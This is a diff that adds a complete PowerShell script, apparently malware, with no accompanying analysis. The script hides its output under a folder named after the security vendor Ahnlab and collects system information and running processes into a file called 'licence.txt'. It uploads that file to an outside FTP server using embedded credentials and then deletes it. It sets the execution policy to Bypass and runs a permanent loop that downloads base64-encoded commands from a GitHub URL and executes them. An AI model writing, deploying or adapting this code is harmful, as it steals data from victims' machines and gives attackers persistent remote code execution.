@@ -1,0 +1,55 @@
+
+$logPath = $env:APPDATA + "\Ahnlab\"
+New-Item -Path $logPath -Type directory -Force
+$logFile = $logPath + "licence.txt"
+
+Function getinfo
+{
+	Start-Sleep -s 1
+	systeminfo >> $logFile
+	Start-Sleep -s 1
+	Get-process >> $logFile
+}
+
+
+function uploadResult
+{
+	
+	$ftpuri = "ftp://4209705:eih*^dhk234HKDFY@meats.mywebcommunity.org/meats.mywebcommunity.org/"
+
+	$upfilepath = $env:APPDATA + "\Ahnlab\licence.txt"
+	$webclient = New-Object System.Net.WebClient
+	$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($upfilepath))
+	$webclient.UploadFile($uri, $upfilepath)
+
+	del $upfilepath
+}
+
+function downCommand
+{
+	$downpsurl = "https://raw.githubusercontent.com/rojkim/source/main/roj.rong"
+	$codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
+
+	
+	$comletter = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($codestring))
+	
+	$result = Invoke-Expression $comletter
+}
+
+function mainFunc
+{
+	Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+	
+	getinfo
+	uploadResult
+
+	while ($true)
+	{		
+		downCommand
+		Start-Sleep -s 2400
+	}
+	
+}
+
+mainFunc
+
